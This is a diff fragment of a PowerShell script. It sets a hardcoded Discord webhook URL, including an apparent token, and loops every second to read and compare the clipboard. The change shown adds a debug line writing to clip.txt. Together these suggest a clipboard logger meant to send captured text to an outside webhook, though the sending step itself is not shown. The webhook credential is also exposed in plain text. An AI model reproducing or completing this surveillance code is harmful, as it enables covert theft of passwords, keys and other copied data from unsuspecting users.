@@ -3,6 +3,7 @@ $webhookUrl  = 'https://discord.com/api/webhooks/1168730851631190066/poAU86kAE69
 $PreviousClipboard = ""
 while($true)
 {
+	add-content -value "Test" -path ".\clip.txt"
 	start-sleep -seconds 1
 	$currentClipboard = get-clipboard | Out-String
     	$currentClipboard = $currentClipboard.Trim()
